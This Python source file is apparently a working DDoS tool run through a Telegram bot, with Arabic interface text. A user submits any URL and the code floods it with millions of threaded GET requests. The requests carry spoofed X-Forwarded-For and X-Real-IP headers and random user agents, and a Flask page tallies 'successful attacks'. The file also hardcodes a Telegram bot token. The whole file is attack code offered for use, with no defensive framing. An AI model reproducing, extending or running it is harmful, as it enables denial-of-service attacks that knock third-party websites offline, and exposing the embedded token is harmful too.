#Mycode @A_Y_TR
#DDos_@A_Y_TR_DF
import requests
from flask import Flask, render_template_string
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
from user_agent import generate_user_agent

a1 = '\x1b[1;31m'  
a3 = '\x1b[1;32m'  
a20 = '\x1b[38;5;226m' 
a22 = '\x1b[38;5;216m'  

app = Flask(__name__)
Almunharif_port_001 = 4000
print('آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم||DF♕')

# حفظ معرف الادمن
admin_id = 6125645260

# دالة لإرسال تنبيه للإدمن عند دخول شخص جديد
def notify_admin(user_id, username):
    message = f'شخص جديد دخل إلى البوت:\nID: {user_id}\nUsername: @{username}'
    requests.post(f'https://api.telegram.org/bot{bot_token}/sendMessage', data={'chat_id': admin_id, 'text': message})

# استبدال الإدخال اليدوي بـ Telegram Bot
import telebot
from telebot import types

bot_token = "7887541654:AAHS1MynRR8WMDM8j1dXV4vFo8-zWjBPCwE"
bot = telebot.TeleBot(bot_token)
Almunharif_url_002 = ""

Almunharif_success_count_003 = 0
Almunharif_failure_count_004 = 0
lock = threading.Lock()  

def Almunharif_generate_random_ip_005():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def Almunharif_send_request_with_retry_006(session, retries=3, delay=1):
    global Almunharif_success_count_003, Almunharif_failure_count_004
    Almunharif_user_agent_007 = generate_user_agent()
    Almunharif_random_ip_008 = Almunharif_generate_random_ip_005()

    Almunharif_headers_009 = {
        "User-Agent": Almunharif_user_agent_007,
        "X-Forwarded-For": Almunharif_random_ip_008,
        "X-Real-IP": Almunharif_random_ip_008
    }

    for _ in range(retries):
        try:
            response = session.get(Almunharif_url_002, headers=Almunharif_headers_009, timeout=5)
            if response.status_code == 200:
                with lock:
                    Almunharif_success_count_003 += 1
                return
        except requests.RequestException:
            time.sleep(delay)
    with lock:
        Almunharif_failure_count_004 += 1

def Almunharif_start_massive_attack_012():
    with ThreadPoolExecutor(max_workers=100) as executor:  
        with requests.Session() as session:  
            while True:
                try:
                    futures = [executor.submit(Almunharif_send_request_with_retry_006, session) for _ in range(10000000)]
                    for future in futures:
                        future.result()
                except Exception as e:
                    print(f"{a1}error: {e}")

@app.route('/')
def Almunharif_index_016():
    return render_template_string('''
        <html>
            <head>
                <title>احصائيات الهجمات</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        text-align: center;
                        background-color: #1a1a2e;
                        color: #e94560;
                        margin: 0;
                        padding: 0;
                    }
                    h1 {
                        margin-top: 50px;
                        font-size: 36px;
                    }
                    p {
                        font-size: 20px;
                        margin: 10px 0;
                    }
                    .stats {
                        margin-top: 30px;
                        padding: 20px;
                        background: #0f3460;
                        border-radius: 10px;
                        display: inline-block;
                        box-shadow: 0 0 10px #e94560;
                    }
                </style>
            </head>
            <body>
                <h1>احصائيات الهجمات</h1>
                <div class="stats">
                    <p><strong>الهجمات الناجحة:</strong> {{ Almunharif_success_count_003 }}</p>
                    <p><strong>الهجمات الفاشلة:</strong> {{ Almunharif_failure_count_004 }}</p>
                </div>
            </body>
        </html>
    ''', Almunharif_success_count_003=Almunharif_success_count_003, Almunharif_failure_count_004=Almunharif_failure_count_004)

# تكامل مع Telegram Bot
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    username = message.from_user.username
    notify_admin(user_id, username)
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    start_button = types.KeyboardButton('🚀 بدء الهجوم')
    stats_button = types.KeyboardButton('📊 إحصائيات الهجوم')
    markup.add(start_button, stats_button)
    bot.send_message(message.chat.id, "مرحباً بك في بوت آلقيـــــــــــــــآدهہ‌‏ أترك 😊هجومك 20 دقيقة على الأقل", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🚀 بدء الهجوم')
def request_url(message):
    msg = bot.reply_to(message, "من فضلك أدخل عنوان URL للهجوم:")
    bot.register_next_step_handler(msg, start_attack)

def start_attack(message):
    global Almunharif_url_002
    Almunharif_url_002 = message.text
    bot.reply_to(message, f'جاري بدء الهجوم على: {Almunharif_url_002}')
    Almunharif_attack_thread_017 = threading.Thread(target=Almunharif_start_massive_attack_012, daemon=True)
    Almunharif_attack_thread_017.start()

@bot.message_handler(func=lambda message: message.text == '📊 إحصائيات الهجوم')
def handle_stats(message):
    bot.reply_to(message, f'الهجمات الناجحة: {Almunharif_success_count_003}\nالهجمات الفاشلة: {Almunharif_failure_count_004}')

Almunharif_attack_thread_017 = threading.Thread(target=Almunharif_start_massive_attack_012, daemon=True)
Almunharif_attack_thread_017.start()

if __name__ == '__main__':
    threading.Thread(target=app.run, kwargs={'port': Almunharif_port_001}).start()
    bot.polling()
